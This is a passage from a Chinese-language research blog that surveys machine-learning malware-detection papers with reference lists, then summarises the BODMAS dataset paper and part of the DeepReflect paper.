<td>Catch them alive: A malware detection approach through memory
forensics, manifoldlearning and computer vision</td>
<td>2021</td>
<td>Visualization</td>
</tr>
</tbody>
</table>
<h3><span id="36-dl-based-144-156">3.6 DL based [144-156]</span></h3>
<table>
<colgroup>
<col style="width: 57%">
<col style="width: 3%">
<col style="width: 39%">
</colgroup>
<thead>
<tr class="header">
<th>Title</th>
<th>Year</th>
<th>Creativity</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Auto-detection of sophisticated malware using lazy-binding control
flow graph and deep learning</td>
<td>2018</td>
<td>1.The improvement of CFG 2. Visualizaiton</td>
</tr>
<tr class="even">
<td>Malware identification using visualization images and deep
learning</td>
<td>2018</td>
<td>1.SimHash of features 2. Visualization</td>
</tr>
<tr class="odd">
<td>Classification of Malware by Using Structural Entropy on
Convolutional Neural Networks</td>
<td>2018</td>
<td>visual similarity</td>
</tr>
<tr class="even">
<td>Classifying Malware Represented as Control Flow Graphs using Deep
Graph Convolutional Neural Network</td>
<td>2019</td>
<td>The improvement of CFG</td>
</tr>
<tr class="odd">
<td><strong>Neurlux: Dynamic Malware Analysis Without Feature
Engineering</strong></td>
<td>2019</td>
<td>Based on dynamic analysis reports</td>
</tr>
<tr class="even">
<td>A feature-hybrid malware variants detection using CNN based opcode
embedding and BPNN based API embedding</td>
<td>2019</td>
<td>Hybrid features</td>
</tr>
<tr class="odd">
<td>Effective analysis of malware detection in cloud computing</td>
<td>2019</td>
<td>The improvement of the DL.</td>
</tr>
<tr class="even">
<td>Recurrent neural network for detecting malware</td>
<td>2020</td>
<td>The improvement of RNN</td>
</tr>
<tr class="odd">
<td><strong>Dynamic Malware Analysis with Feature Engineering and
Feature Learning</strong></td>
<td>2020</td>
<td>Feature hashing to encode API call info.</td>
</tr>
<tr class="even">
<td>An improved two-hidden-layer extreme learning machine for malware
hunting</td>
<td>2020</td>
<td>Improvement of the DL.</td>
</tr>
<tr class="odd">
<td>HYDRA: A multimodal deep learning framework for malware
classification</td>
<td>2020</td>
<td>Hybrid features</td>
</tr>
<tr class="even">
<td>A novel method for malware detection on ML-based visualization
technique</td>
<td>2020</td>
<td>visualization</td>
</tr>
<tr class="odd">
<td>Image-Based malware classification using ensemble of CNN
architectures (IMCEC)</td>
<td>2020</td>
<td>visualization</td>
</tr>
</tbody>
</table>
<h2><span id="4-mldl-flaws-overview">4. ML/DL flaws Overview</span></h2>
<ul>
<li>Ensemble classifier evasion [42]</li>
<li>Performance degradation [42,46,53,54]</li>
<li>Adversarial example generation [43,44,45,48,55,56,57,58]</li>
<li>Poisoning Attack [47]</li>
<li>Feature weights [49]</li>
<li>Cost analysis [50]</li>
<li>ML bias from dataset [51]</li>
<li>Influence of packing [52]</li>
<li>Methods reproduction [59]</li>
</ul>
<h2><span id="5-references">5. References</span></h2>
<ol type="1">
<li><p>2014 A Survey of Android Malware Characterisitics and Mitigation
Techniques</p></li>
<li><p>2014 Smartphone Malware and Its Propagation Modeling:A
Survey</p></li>
<li><p>2015 Android Security: A Survey of Issues, Malware Penetration,
and Defenses</p></li>
<li><p>2014 Evolution and Detection of Polymorphic and Metamorphic
Malwares: A Survey</p></li>
<li><p>2015 Kernel Malware Core Implementation: A Survey</p></li>
<li><p>2016 A Survey of Stealth Malware Attacks, Mitigation Measures,
and Steps Toward Autonomous Open World Solutions</p></li>
<li><p>2016 On the Security of Machine Learning in Malware C&amp;C
Detection: A Survey</p></li>
<li><p>2017 Malware Methodologies and Its Future: A Survey</p></li>
<li><p>2017 A Survey on Malware Detection Using Data Mining
Techniques</p></li>
<li><p>2018 Malware Dynamic Analysis Evasion Techniques: A
Survey</p></li>
<li><p>2018 Android Malware Detection: A Survey</p></li>
<li><p>2018 A Survey on Metamorphic Malware Detection based on Hidden
Markov Model</p></li>
<li><p>2018 Machine Learning Aided Static Malware Analysis: A Survey and
Tutorial</p></li>
<li><p>2018 A survey on dynamic mobile malware detection</p></li>
<li><p>2018 A survey of malware behavior description and
analysis</p></li>
<li><p>2019 A Survey on Android Malware Detection Techniques Using
Machine Learning Algorithms</p></li>
<li><p>2019 Dynamic Malware Analysis in the Modern Era—A State of the
Art Survey</p></li>
<li><p>2019 Data-Driven Android Malware Intelligence: A Survey</p></li>
<li><p>2019 A survey of zero-day malware attacks and itsdetection
methodology</p></li>
<li><p>2019 A Survey on malware analysis and mitigation
techniques</p></li>
<li><p><strong>2019 Survey of machine learning techniques for malware
analysis</strong></p></li>
<li><p>2020 Deep Learning and Open Set Malware Classification: A
Survey</p></li>
<li><p>2020 A Comprehensive Survey on Machine Learning Techniques for
Android Malware Detection</p></li>
<li><p>2015 A Survey on Mining Program-Graph Features for Malware
Analysis</p></li>
<li><p>2020 Stochastic Modeling of IoT Botnet Spread: A Short Survey on
Mobile Malware Spread Modeling</p></li>
<li><p>2020 A survey of IoT malware and detection methods based on
static features</p></li>
<li><p>2020 A survey on practical adversarial examples for malware
classifiers</p></li>
<li><p>2020 A Survey of Machine Learning Methods and Challenges for
Windows Malware Classification</p></li>
<li><p>2020 A Survey on Malware Detection with Deep Learning</p></li>
<li><p>2020 An emerging threat Fileless malware: a survey and research
challenges</p></li>
<li><p>2021 Malware classification and composition analysis: A survey of
recent developments</p></li>
<li><p><strong>2021 Adversarial EXEmples: A Survey and Experimental
Evaluation of Practical Attacks on Machine Learning for Windows Malware
Detection</strong></p></li>
<li><p>2020 A Survey on Mobile Malware Detection Techniques</p></li>
<li><p>2021 Towards interpreting ML-based automated malware detection
models: a survey</p></li>
<li><p>2021 A Survey of Android Malware Detection with Deep Neural
Models</p></li>
<li><p>2021 A survey of malware detection in Android apps:
Recommendations and perspectives for future research</p></li>
<li><p>2021 A survey of android application and malware
hardening</p></li>
<li><p>2021 A survey on machine learning-based malware detection in
executable files</p></li>
<li><p>2021 The evolution of IoT Malwares, from 2008 to 2019: Survey,
taxonomy, process simulator and perspectives</p></li>
<li><p>2021 A Survey of Android Malware Static Detection Technology
Based on Machine Learning</p></li>
<li><p>2016 Empirical assessment of machine learning-based malware
detectors for Android Measuring the gap between in-the-lab and
in-the-wild validation scenarios</p></li>
<li><p>2016 When a Tree Falls: Using Diversity in Ensemble Classifiers
to Identify Evasion in Malware Detectors</p></li>
<li><p><strong>2016 Automatically Evading Classifiers A Case Study on
PDF Malware Classifiers</strong></p></li>
<li><p>2017 SecureDroid: Enhancing Security of Machine Learning-based
Detection against Adversarial Android Malware Attacks</p></li>
<li><p>2017 How to defend against adversarial attack</p></li>
<li><p><strong>2017 Transcend: Detecting Concept Drift in Malware
Classification Models</strong></p></li>
<li><p><strong>2018 Automated poisoning attacks and defenses in malware
detection systems: An adversarial machine learning
approach</strong></p></li>
<li><p><strong>2018 Generic Black-Box End-to-End Attack Against State of
the Art API Call Based Malware Classifiers</strong></p></li>
<li><p><strong>==2019 Yes, Machine Learning Can Be More Secure! A Case
Study on Android Malware Detection==</strong></p></li>
<li><p>2019 A cost analysis of machine learning using dynamic runtime
opcodes for malware detection</p></li>
<li><p><strong>2019 TESSERACT: Eliminating Experimental Bias in Malware
Classification across Space and Time</strong></p></li>
<li><p>2020 When Malware is Packin’ Heat; Limits of Machine Learning
Classifiers Based on Static Analysis Features</p></li>
<li><p>2020 Assessing and Improving Malware Detection Sustainability
through App Evolution Studies</p></li>
<li><p>2020 On Training Robust PDF Malware Classifiers</p></li>
<li><p>2020 Adversarial Deep Ensemble: Evasion Attacks and Defenses for
Malware Detection</p></li>
<li><p>2020 Intriguing Properties of Adversarial ML Attacks in the
Problem Space Fabio</p></li>
<li><p>2020 Query-Efficient Black-Box Attack Against Sequence-Based
Malware Classifiers</p></li>
<li><p>2020 Enhancing State-of-the-art Classifiers with API Semantics to
Detect Evolved Android Malware</p></li>
<li><p>2021 Lessons Learnt on Reproducibility in Machine Learning Based
Android Malware Detection</p></li>
<li><p>2016 Semantics-Based Online Malware Detection: Towards Efficient
Real-Time Protection Against Malware</p></li>
<li><p>2018 Understanding Linux Malware</p></li>
<li><p>2017 Droid-AntiRM: Taming Control Flow Anti-analysis to Support
Automated Dynamic Analysis of Android Malware</p></li>
<li><p>2017 Malton: Towards On-Device Non-Invasive Mobile Malware
Analysis for ART</p></li>
<li><p>2015 CopperDroid: Automatic Reconstruction of Android Malware
Behaviors</p></li>
<li><p>2018 EnMobile: Entity-based Characterization and Analysis of
Mobile</p></li>
<li><p>2015 Screening smartphone applications using malware family
signatures</p></li>
<li><p>2018 Toward a more dependable hybrid analysis of android malware
using aspect-oriented programming</p></li>
<li><p>2017 DroidNative: Automating and optimizing detection of Android
native code malware variants</p></li>
<li><p>2016 An HMM and structural entropy based detector for Android
malware: An empirical study</p></li>
<li><p>2020 Scalable and robust unsupervised android malware
fingerprinting using community-based network partitioning</p></li>
<li><p>2020 On the use of artificial malicious patterns for android
malware detection</p></li>
<li><p>2016 Andro-Dumpsys: Anti-malware system based on the similarity
of malware creator and malware centric information</p></li>
<li><p>2020 Bayesian Active Malware Analysis</p></li>
<li><p>2020 PermPair: Android Malware Detection Using Permission
Pairs</p></li>
<li><p>2014 Apposcopy: Semantics-Based Detection of Android Malware
through Static Analysis</p></li>
<li><p>2015 Profiling user-trigger dependence for Android malware
detection</p></li>
<li><p>2019 Identifying Android Malware Using Network-Based
Approaches</p></li>
<li><p>2016 Cypider: Building Community-Based Cyber-Defense
Infrastructure for Android Malware Detection</p></li>
<li><p>2014 Semantics-Aware Android Malware Classification Using
Weighted Contextual API Dependency Graphs</p></li>
<li><p>2017 MAMADROID: Detecting Android Malware by Building Markov
Chains of Behavioral Models</p></li>
<li><p>2014 Drebin: Effective and Explainable Detection of Android
Malware in Your Pocket</p></li>
<li><p>2018 Make Evasion Harder: An Intelligent Android Malware
Detection System</p></li>
<li><p>2018 Using Loops For Malware Classification Resilient to
Feature-unaware Perturbations</p></li>
<li><p>2016 Semantic Modelling of Android Malware for Effective Malware
Comprehension, Detection, and Classification</p></li>
<li><p>2018 Detecting Android Malware Leveraging Text Semantics of
Network Flows</p></li>
<li><p>2018 Improving Accuracy of Android Malware Detection with
Lightweight Contextual Awareness</p></li>
<li><p>2019 MalScan: Fast Market-Wide Mobile Malware Scanning by
Social-Network Centrality Analysis</p></li>
<li><p>2017 PIndroid: A novel Android malware detection system using
ensemble learning methods</p></li>
<li><p>2017 A pragmatic android malware detection procedure</p></li>
<li><p>2016 ICCDetector: ICC-Based Malware Detection on Android</p></li>
<li><p>2015 A Probabilistic Discriminative Model for Android Malware
Detection with Decompiled Source Code</p></li>
<li><p>2019 DroidCat: Effective Android Malware Detection and
Categorization via App-Level Profiling</p></li>
<li><p>2018 MADAM: Effective and Efficient Behavior-based Android
Malware Detection and Prevention</p></li>
<li><p>2020 Android Malware Detection via (Somewhat) Robust Irreversible
Feature Transformations</p></li>
<li><p>2018 Leveraging ontologies and machine-learning techniques for
malware analysis into Android permissions ecosystems</p></li>
<li><p>2018 Lightweight, Obfuscation-Resilient Detection and Family
Identification of Android Malware</p></li>
<li><p>2018 A multi-view context-aware approach to Android malware
detection and malicious code localization</p></li>
<li><p>2019 DroidFusion: A Novel Multilevel Classifier Fusion Approach
for Android Malware Detection</p></li>
<li><p>2020 DL-Droid: Deep learning based android malware detection
using real devices</p></li>
<li><p>2021 JOWMDroid: Android malware detection based on feature
weighting with joint optimization of weight-mapping and classifier
parameters</p></li>
<li><p>2020 Towards using unstructured user input request for malware
detection</p></li>
<li><p>2021 Toward s an interpretable deep learning model for mobile
malware detection and family identification</p></li>
<li><p>2020 AMalNet: A deep learning framework based on graph
convolutional networks for malware detection</p></li>
<li><p>2021 Disentangled Representation Learning in Heterogeneous
Information Network for Large-scale Android Malware Detection in the
COVID-19 Era and Beyond</p></li>
<li><p>2019 A Multimodal Deep Learning Method for Android Malware
Detection Using Various Features</p></li>
<li><p>2019 Android Fragmentation in Malware Detection</p></li>
<li><p>2019 An Image-inspired and CNN-based Android Malware Detection
Approach</p></li>
<li><p>2021 A Performance-Sensitive Malware Detection System Using Deep
Learning on Mobile Devices</p></li>
<li><p>2020 Byte-level malware classification based on markov images and
deep learning</p></li>
<li><p>2013 API Chaser: Anti-analysis Resistant Malware
Analyzer</p></li>
<li><p>2018 MalViz: An Interactive Visualization Tool for Tracing
Malware</p></li>
<li><p>2017 CloudEyes: Cloud-based malware detection with reversible
sketch for resource-constrained internet of things (IoT)
devices</p></li>
<li><p>2013 A fast malware detection algorithm based on
objective-oriented association mining</p></li>
<li><p>2013 PoMMaDe: Pushdown Model-checking for Malware
Detection</p></li>
<li><p>2014 Growing Grapes in Your Computer to Defend Against
Malware</p></li>
<li><p>2015 Hypervisor-based malware protection with
AccessMiner</p></li>
<li><p>2015 Probabilistic Inference on Integrity for Access Behavior
Based Malware Detection</p></li>
<li><p>2018 Probabilistic analysis of dynamic malware traces</p></li>
<li><p>2018 A malware detection method based on family behavior
graph</p></li>
<li><p>2018 Malware classification using self organising feature maps
and machine activity data</p></li>
<li><p>2019 Volatile memory analysis using the MinHash method for
efficient and secured detection of malware in private cloud</p></li>
<li><p>2020 A dynamic Windows malware detection and prediction method
based on contextual understanding of API call sequence</p></li>
<li><p>2013 Deriving common malware behavior through graph
clustering</p></li>
<li><p>2014 Enhancing the detection of metamorphic malware using call
graphs</p></li>
<li><p>2016 Minimal contrast frequent pattern mining for malware
detection</p></li>
<li><p>2019 Heterogeneous Graph Matching Networks for Unknown Malware
Detection</p></li>
<li><p>2021 Random CapsNet for est model for imbalanced malware type
classification task</p></li>
<li><p>2013 A Scalable Approach for Malware Detection through Bounded
Feature Space Behavior Modeling</p></li>
<li><p>2013 SigMal: A Static Signal Processing Based Malware
Triage</p></li>
<li><p>2014 Unsupervised Anomaly-Based Malware Detection Using Hardware
Features</p></li>
<li><p>2014 Control flow-based opcode behavior analysis for Malware
detection</p></li>
<li><p>2015 Employing Program Semantics for Malware Detection</p></li>
<li><p>2015 AMAL: High-fidelity, behavior-based automated malware
analysis and classification</p></li>
<li><p>2016 Optimized Invariant Representation of Network Traffic for
Detecting Unseen Malware Variants</p></li>
<li><p>2017 DYNAMINER: Leveraging Offline Infection Analytics for
On-the-Wire Malware Detection</p></li>
<li><p>2017 Security importance assessment for system objects and
malware detection</p></li>
<li><p>2018 From big data to knowledge: A spatiotemporal approach to
malware detection</p></li>
<li><p>2019 MalDAE: Detecting and explaining malware based on
correlation and fusion of static and dynamic characteristics</p></li>
<li><p>2019 Leveraging Compression-Based Graph Mining for Behavior-Based
Malware Detection</p></li>
<li><p>2020 Advanced Windows Methods on Malware Detection and
Classification</p></li>
<li><p>2020 Sub-curve HMM: A malware detection approach based on partial
analysis of API call sequences</p></li>
<li><p>2020 Multiclass malware classification via first- and
second-order texture statistics</p></li>
<li><p>2021 Catch them alive: A malware detection approach through
memory forensics, manifold learning and computer vision</p></li>
<li><p>2018 Auto-detection of sophisticated malware using lazy-binding
control flow graph and deep learning</p></li>
<li><p>2018 Malware identification using visualization images and deep
learning</p></li>
<li><p>2018 Classification of Malware by Using Structural Entropy on
Convolutional Neural Networks</p></li>
<li><p>2019 Classifying Malware Represented as Control Flow Graphs using
Deep Graph Convolutional Neural Network</p></li>
<li><p>2019 Neurlux: Dynamic Malware Analysis Without Feature
Engineering</p></li>
<li><p>2019 A feature-hybrid malware variants detection using CNN based
opcode embedding and BPNN based API embedding</p></li>
<li><p>2019 Effective analysis of malware detection in cloud
computing</p></li>
<li><p>2020 Recurrent neural network for detecting malware</p></li>
<li><p>2020 Dynamic Malware Analysis with Feature Engineering and
Feature Learning</p></li>
<li><p>2020 An improved two-hidden-layer extreme learning machine for
malware hunting</p></li>
<li><p>2020 HYDRA: A multimodal deep learning framework for malware
classification</p></li>
<li><p>2020 A novel method for malware detection on ML-based
visualization technique</p></li>
<li><p>2020 Image-Based malware classification using ensemble of CNN
architectures (IMCEC)</p></li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://powerlzy.github.io/posts/1KY76QV/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat_mac.jpg">
      <meta itemprop="name" content="lzy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PowerLZY's Blog">
      <meta itemprop="description" content="相比到达的地方，同行的人更重要！">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | PowerLZY's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/1KY76QV/" class="post-title-link" itemprop="url">恶意软件检测（5）BODMAS-An Open Dataset for Learning based Temporal Analysis of PE Malware</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-08-05 12:18:22" itemprop="dateCreated datePublished" datetime="2021-08-05T12:18:22+08:00">2021-08-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-04-19 15:49:51" itemprop="dateModified" datetime="2023-04-19T15:49:51+08:00">2023-04-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">【draft】应用</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/%E5%AD%A6%E6%9C%AF%E5%89%8D%E6%B2%BF/" itemprop="url" rel="index"><span itemprop="name">学术前沿</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/%E5%AD%A6%E6%9C%AF%E5%89%8D%E6%B2%BF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>1.4k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>2 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3><span id="bodmasan-open-dataset-for-learning-based-temporal-analysis-of-pe-malware">BODMAS:
An Open Dataset for Learning based Temporal Analysis of PE Malware</span></h3>
<blockquote>
<p>2021 <a target="_blank" rel="noopener" href="https://dblp.uni-trier.de/db/conf/sp/sp2021w.html#YangCLA021">SP
Workshops</a></p>
<p>On training robust PDF malware classifiers. (2020 USENIX)</p>
</blockquote>
<h3><span id="一-摘要">一、摘要</span></h3>
<p>我们描述并发布了一个名为BODMAS的开放PE恶意软件数据集，以促进基于机器学习的恶意软件分析的研究工作。通过仔细检查现有的open
PE恶意软件数据集，我们发现了两个缺失的功能（即<strong>最近/时间戳</strong>的恶意软件样本和精心策划的<strong>家族信息</strong>），这限制了研究人员研究<strong>概念漂移和恶意软件系列演化</strong>等紧迫问题的能力。出于这些原因，我们发布了一个新的数据集来填补空白。<strong>BODMAS数据集包含从2019年8月至2020年9月收集的57293个恶意软件样本和77142个良性样本，以及精心策划的家族信息（581个家族）</strong>。我们还进行了初步分析，以说明概念漂移的影响，并讨论该数据集如何有助于促进现有和未来的研究工作。</p>
<h3><span id="二-说明">二、说明</span></h3>
<p>如今，研究人员[30]、[5]、[11]、[6]和反病毒供应商[1]将机器学习模型（包括深度神经网络）广泛应用于恶意软件分析任务中。在这一工作领域，拥有公共数据集和开放基准是非常可取的。一方面，这些数据集将有助于促进解决开放性挑战的新工作（例如，对抗性机器学习、可解释技术[28]、[10]）。另一方面，公共基准和数据集可以帮助研究人员轻松地比较他们的模型，并跟踪整个社区的进展。然而，创建开放式恶意软件数据集是一项极具挑战性的工作。例如，[5]的作者讨论了许多此类挑战，包括<strong>法律限制、标记恶意软件样本的成本和难度，以及潜在的安全责任</strong>。除了这些因素外，另一个关键挑战是恶意软件（以及良性软件）的动态演化性质[20]。随着时间的推移，新的恶意软件系列和变种不断出现，它们不断地对底层数据分布进行更改。因此，随着时间的推移，不断需要发布新的数据集和基准。在过去的十年中，只有少数公开的PE恶意软件数据集发布到研究社区[30]。值得注意的例子包括Microsoft恶意软件分类挑战数据集[24]、Ember[5]、<strong>UCSB打包恶意软件数据集[2]</strong>和最近的SOREL-20M数据集[11]。我们在表一中总结了它们的主要特征。</p>
<blockquote>
<p>[30] Survey of machine learning techniques for malware analysis.
(2019 C&amp;S)</p>
<p>[5] Ember: an open dataset for training static pe malware machine
learning models</p>
<p>[11] SOREL-20M: A Large Scale Benchmark Dataset for Malicious PE
Detection</p>
<p><strong>[6] Scalable, behavior-based malware clustering (2009
NDSS)</strong></p>
<p><strong>[28] Exploring backdoor poisoning attacks against malware
classifiers</strong></p>
<p><strong>[10] Maldae: Detecting and explaining malware based on
correlation and fusion of static and dynamic characteristics. (2019
C&amp;S)</strong></p>
<p>[20]</p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://powerlzy.github.io/posts/2Y43CXR/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat_mac.jpg">
      <meta itemprop="name" content="lzy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PowerLZY's Blog">
      <meta itemprop="description" content="相比到达的地方，同行的人更重要！">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | PowerLZY's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/2Y43CXR/" class="post-title-link" itemprop="url">恶意软件检测（6）DeepReflect：通过二进制重构发现恶意行为</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-08-05 12:18:22" itemprop="dateCreated datePublished" datetime="2021-08-05T12:18:22+08:00">2021-08-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-04-19 15:50:27" itemprop="dateModified" datetime="2023-04-19T15:50:27+08:00">2023-04-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">【draft】应用</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/%E5%AD%A6%E6%9C%AF%E5%89%8D%E6%B2%BF/" itemprop="url" rel="index"><span itemprop="name">学术前沿</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/%E5%AD%A6%E6%9C%AF%E5%89%8D%E6%B2%BF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>9.2k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>17 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2><span id="usenixsec21deepreflect通过二进制重构发现恶意行为经典">USENIXSec21
DeepReflect：通过二进制重构发现恶意行为（经典）</span></h2>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg&amp;mid=2247495981&amp;idx=1&amp;sn=fa34f5211e67a7d6c144019424657d22&amp;chksm=cfcf41e0f8b8c8f6e91705e142147a6803ca1af45aa8173727e7858788b1473da5b00db25d7b&amp;scene=178&amp;cur_album_id=1776483007625822210#rd">参考材料</a></p>
<p>原文作者：Evan Downing, Yisroel Mirsky, Kyuhong Park, Wenke Lee
原文标题：DeepReflect: Discovering Malicious Functionality through
Binary Reconstruction
原文链接：https://www.usenix.org/conference/usenixsecurity21/presentation/downing
发表会议：USENIXSec 2021
<strong>代码地址</strong>：https://github.com/evandowning/deepreflect</p>
</blockquote>
<h3><span id="一-摘要">一、摘要</span></h3>
<p>深度学习已在恶意软件分类任务中表现出良好的结果。然而：</p>
<ul>
<li><strong>人工分析效率低</strong>：对于未知恶意软件的binary，分析人员仍要花大量时间来利用静态分析工具逆向整个binary，从而识别关键的恶意行为</li>
<li><strong>监督学习开销大</strong>：尽管机器学习可用来帮助识别二进制的重要部分，但由于获取足够大的标记数据集开销很大，因此监督学习方法是不切实际的</li>
</ul>
<p><strong>为了提高静态（或手动）逆向工程的生产力，我们提出了DeepReflect：一种用于定位（localize）和识别（identify）恶意二进制文件中恶意软件组件的工具。</strong></p>
<ul>
<li>为了定位恶意软件组件，我们以一种新型（novel）方式，即首先使用一个<strong>无监督的深度神经网络l来定位恶意软件中恶意组件（函数）的位置</strong></li>
<li><strong>其次，通过半监督聚类分析对恶意组件进行分类，根据恶意行为分类确定恶意函数的行为</strong>，其中分析人员在他们的日常工作流程中逐步提供标签</li>
<li>该工具是实用的，因为它不需要数据标记（require no data
labeling）来训练定位模型，也不需要最小/非侵入性标记来增量地训练分类器</li>
</ul>
<h4><span id="11-企业界对比capa">1.1 <strong>企业界对比：CAPA</strong></span></h4>
<p>我们通过5个恶意软件分析人员对超过26k个恶意软件样本进行评估。<strong>实验发现，DeepReflect让每个分析人员需要逆向工程的函数数量平均减少了85%</strong>。本文方法还可以检测到80%的恶意软件组件，而当使用基于签名的工具CAPA时，该值仅为43%。</p>
<h4><span id="12-学术界对比shap">1.2 <strong>学术界对比：Shap</strong></span></h4>
<p>此外，DeepReflect提出的自动编码器（autoencoder）比Shap（一种人工智能解释工具）表现得更好。这一点很重要，因为<strong>Shap是一种最先进（state-of-the-art）的方法，需要一个标记的数据集</strong>，而我们的自动编码器不需要。</p>
<h3><span id="二-引言">二、引言</span></h3>
<h4><span id="21-背景引出挑战">2.1 背景引出挑战</span></h4>
<p>静态逆向工程恶意软件可能是一个手动且乏味的过程。公司每周可以收到多达
500
万个PE样本。虽然大多数组织提前对这些样本进行分类（triage），以减少要分析的恶意软件数量（即，检查
VirusTotal来获取反病毒 (AV)
引擎结果、在受控沙箱中执行样本、提取静态和动态签名等）
，但最终仍然需要静态逆向工程的恶意软件样本。这是因为<strong>总会有新的恶意软件样本</strong>，没有被反病毒公司分析过，或者缺乏签名来识别这些新样本。最终，该样本有可能会拒绝在分析人员的动态沙箱（sandbox）中执行。</p>
<p>当前的解决方案以为恶意软件样本创建签名、分类和聚类的形式存在。然而，这些解决方案只能预测样本的类别（例如，良性与恶意，或特定的恶意软件家族）。<strong>他们无法定位或解释恶意软件样本本身内部的行为（定位恶意函数位置、解释恶意函数行为），而分析师需要执行（perform）这些行为来生成报告并改进他们公司的恶意软件检测产品</strong>。事实上，由于工作量过大，该领域已呈现了倦怠。</p>
<p>为了确定他们的需求，我们咨询了四名逆向工程恶意软件分析师（一名来自AV公司，三名来自政府部门）。本文发现，如果恶意软件分析师有一个工具可以：</p>
<ul>
<li><strong>识别恶意软件中恶意函数的位置</strong></li>
<li><strong>标记这些恶意函数的行为</strong></li>
</ul>
<p>那么，他们的工作将更有效率。开发这样一种工具的挑战在于：</p>
<ul>
<li><strong>需要能够区分什么是良性的（benign），什么是恶意的（malicious）</strong></li>
<li><strong>理解识别出的恶意行为的语义</strong></li>
</ul>
<p>对于第一个挑战，区分良性和恶意是困难的，因为恶意软件和良性软件的行为通常在高层次上重叠。对于第二个挑战，自动标记和验证这些行为是很困难的，因为没有单独标记的恶意软件函数的数据集（与使用反病毒标签的开放数据集的恶意软件检测和分类系统不同）。</p>
<h4><span id="22-如何解决挑战">2.2 如何解决挑战</span></h4>
<p>为了解决这些挑战，我们开发了DEEPREFLECT，它使用：</p>
<ul>
<li><font color="red"><strong>一个无监督的深度学习模型来定位二进制中的恶意函数【异常检测】</strong></font></li>
